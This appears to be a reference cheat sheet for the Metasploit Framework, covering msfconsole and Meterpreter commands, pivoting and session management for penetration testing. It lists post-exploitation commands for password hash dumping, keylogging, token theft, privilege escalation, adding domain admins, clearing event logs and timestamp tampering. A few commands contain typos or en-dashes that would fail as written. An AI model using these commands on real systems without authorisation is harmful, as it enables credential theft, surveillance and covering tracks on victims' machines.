### Metasploit
<Callout>The Metasploit Framework is a Ruby-based penetration testing platform that writing, testing, and executing exploit code.
Metasploit contains a suite of tools to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.</Callout>

#### **MSFconsole Commands**

| Command         | Description                                                          |
| --------------- | -------------------------------------------------------------------- |
| `show exploits` | Show all exploits within the Framework.                              |
| `show payloads` | Show all payloads within the Framework.                              |
| `setg`          | Set a specific value globally (for example, LHOST or RHOST).         |
| `show options`  | Show the options available for a module or exploit.                  |
| `show targets`  | Show the platforms supported by the exploit.                         |
| `set target`    | Specify a specific target index if you know the OS and service pack. |
| `set payload`   | Specify the payload to use.                                          |
| `show advanced` | Show advanced options.                                               |
| `sessions -l`   | List available sessions (used when handling multiple shells).        |
| `sessions -i`   | Interact with a session.                                             |
| `sessions -K`   | Kill all live sessions.                                              |
| `sessions -c`   | Execute a command on all live Meterpreter sessions.                  |
| `sessions -u`   | Upgrade a normal Win32 shell to a Meterpreter console.  

#### **Meterpreter Commands**

| Command                                    | Description                                                                                   |
| ------------------------------------------ | --------------------------------------------------------------------------------------------- |
| `migrate <proc. id>`                       | Migrate to the specific process ID (PID is the target process ID gained from the ps command).  |
| `list_tokens -u`                           | List available tokens on the target by user.                                                  |
| `list_tokens -g`                           | List available tokens on the target by group.                                                 |
| `impersonate_token <DOMAIN_NAME\USERNAME>` | Impersonate a token available on the target.                                                  |
| `steal_token <proc. id>`                   | Steal the tokens available for a given process and impersonate that token.                    |
| `drop_token`                               | Stop impersonating the current token.                                                         |
| `getsystem`                                | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
| `shell`                                    | Drop into an interactive shell with all available tokens.                                     |
| `execute -f <cmd.exe> -i`                  | Execute cmd.exe and interact with it.                                                         |
| `execute -f <cmd.exe> -i -t`               | Execute cmd.exe with all available tokens.                                                    |
| `execute -f <cmd.exe> -i -H -t`            | Execute cmd.exe with all available tokens and make it a hidden process.                       |
| `rev2self`                                 | Revert back to the original user you used to compromise the target.                           |
| `reg`                                      | Interact, create, delete, query, set, and much more in the target’s registry.                 |
| `setdesktop`                               | Switch to a different screen based on who is logged in.                                       |
| `screenshot`                               | Take a screenshot of the target’s screen.                                                     |
| `upload`                                   | Upload a file to the target.                                                                  |
| `download`                                 | Download a file from the target.                                                              |
| `keyscan_start`                            | Start sniffing keystrokes on the remote target.                                               |
| `keyscan_dump`                             | Dump the remote keys captured on the target.                                                  |
| `keyscan_stop`                             | Stop sniffing keystrokes on the remote target.                                                |
| `getprivs`                                 | Get as many privileges as possible on the target.                                             |
| `uictl enable <keyboard/mouse>`            | Take control of the keyboard and/or mouse.                                                    |
| `background`                               | Run your current Meterpreter shell in the background.                                         |
| `hashdump`                                 | Dump all hashes on the target.                                                                |
| `use sniffer`                              | Load the sniffer module.                                                                      |
| `sniffer_interfaces`                       | List the available interfaces on the target.                                                  |
| `sniffer_dump <pcapname>`                  | Start sniffing on the remote target.                                                          |
| `sniffer_start <packet-buffer>`            | Start sniffing with a specific range for a packet buffer.                                     |
| `sniffer_stats`                            | Grab statistical information from the interface you are sniffing.                             |
| `sniffer_stop`                             | Stop the sniffer.                                                                             |
| `add_user -h`                              | Add a user on the remote target.                                                              |
| `add_group_user <'Domain Admins'> -h`      | Add a username to the Domain Administrators group on the remote target.                       |
| `clearev`                                  | Clear the event log on the target machine.                                                    |
| `timestomp`                                | Change file attributes, such as creation date (antiforensics measure).                        |
| `reboot`                                   | Reboot the target machine.

#### **Importing External Exploits into MSFConsole**

The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`. Alternatively, you can use the folder `/home/username/.msf4`. To import a module, you just need to copy it into one of the previous folders and use the `reload_all` command. Alternatively, you can load a module at runtime by using `loadpath /usr/share/metasploit-framework/modules/`.


***

#### **Meterpreter Pivoting**

| Command                                       | Description                                                                                                                     |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `portfwd add -R -l 8443 -p 1234 -L 10.10.14.15` | Set up a local port forwarding rule to forward all traffic destined to port 1234 on 10.10.14.15 to port 8443 on our attack host |
| `run autoroute -s 172.16.9.0/23`              | Set up a route to the 172.16.9.0/23 subnet                                                                                      |

#### Search for module:

```shell
msf > search [regex]
```

#### Specify and exploit to use:

```shell
msf > use exploit/[ExploitPath]
```

#### Specify a Payload to use:

```shell
msf > set PAYLOAD [PayloadPath]
```

#### Show options for the current modules:

```shell
msf > show options
```

#### Set options:

```shell
msf > set [Option] [Value]
```

#### Start exploit:

```shell
msf > exploit 
```

### Useful Auxiliary Modules

#### Port Scanner:

```shell
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

#### DNS Enumeration:

```shell
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

#### FTP Server:

```shell
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

#### Proxy Server:

```shell
msf > use auxiliary/server/socks4
msf > run 
```

### MSFVenom
Here is the cheatsheet of [MSFVenom](https://pentopsvault.vercel.app/docs/CheatSheets/msfvenom)

### Metasploit Meterpreter

#### Base Commands:

```shell
? / help              # Display a summary of commands
exit / quit           # Exit the Meterpreter session
sysinfo               # Show the system name and OS type
shutdown / reboot     # Self-explanatory
```

#### File System Commands:

```shell
cd                    # Change directory
lcd                   # Change directory on local (attacker's) machine
pwd / getwd           # Display current working directory
ls                    # Show the contents of the directory
cat                   # Display the contents of a file on screen
download / upload     # Move files to/from the target machine
mkdir / rmdir         # Make / remove directory
edit                  # Open a file in the default editor (typically vi)
```

#### Process Commands:

```shell
getpid                # Display the process ID that Meterpreter is running inside
getuid                # Display the user ID that Meterpreter is running with
ps                    # Display process list
kill                  # Terminate a process given its process ID
execute               # Run a given program with the privileges of the process the Meterpreter is loaded in
migrate               # Jump to a given destination process ID
```

#### Network Commands:

```shell
ipconfig              # Show network interface information
portfwd               # Forward packets through TCP session
route                 # Manage/view the system's routing table
```

#### Misc Commands:

```shell
idletime              # Display the duration that the GUI of the target machine has been idle
uictl [enable/disable] [keyboard/mouse]  # Enable/disable either the mouse or keyboard of the target machine
screenshot            # Save as an image a screenshot of the target machine
```

#### Additional Modules:

```shell
use [module]          # Load the specified module
                      # Example: use priv (Load the priv module)
hashdump              # Dump the hashes from the box
timestomp             # Alter NTFS file timestamps
```

### Managing Sessions

#### Multiple Exploitation:

Run the exploit expecting a single session that is immediately backgrounded:

```shell
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```shell
msf > exploit –j
```

#### List all current jobs (usually exploit listeners):

```shell
msf > jobs –l
```

#### Kill a job:

```shell
msf > jobs –k [JobID]
```

### Multiple Sessions:

#### List all backgrounded sessions:

```shell
msf > sessions -l
```

#### Interact with a backgrounded session:

```shell
msf > session -i [SessionID]
```

#### Background the current interactive session:

```shell
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

#### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```shell
msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]
```